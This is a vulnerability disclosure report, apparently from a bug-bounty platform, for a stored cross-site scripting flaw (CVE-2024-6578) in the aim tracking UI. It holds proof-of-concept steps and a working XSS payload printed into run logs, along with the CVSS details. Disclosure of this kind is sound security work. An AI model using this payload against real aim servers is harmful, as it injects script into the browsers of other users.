@@ -1,0 +1,39 @@
+Title: Stored XSS through run logs in aimhubio/aim
+
+Proof of Concept: 
+Run the aim UI and the remote tracking server by using the following commands:
+
+aim server
+aim up
+
+Run the following python-file after following a valid Python-install of the aim SDK:
+
+from aim import Run
+
+run = Run(repo="aim://SERVER_IP:53800")
+
+print("<image src/onerror=prompt(8)>")
+
+Navigate to http://SERVER_IP:43800/runs/RUN_ID/logs (found by navigating to http://SERVER_IP:43800/runs/, clicking on the run, and going to the logs-tab)
+
+Impact: 
+This seems like a standard stored XSS vulnerability. It does not require any user input to trigger, and can be prepared/hidden among "actual" log entries by the attacker for any run.
+
+CVE ID: CVE-2024-6578
+Status: (published)
+Vulnerability Type: CWE-79: Cross-site Scripting (XSS) - Stored
+Severity: High (7.2)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Changed
+Confidentiality: Low
+Integrity: Low
+Availability: None
+Registry: Pypi
+Affected Version: 3.19.3
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $450
+Fix Bounty: $112.5
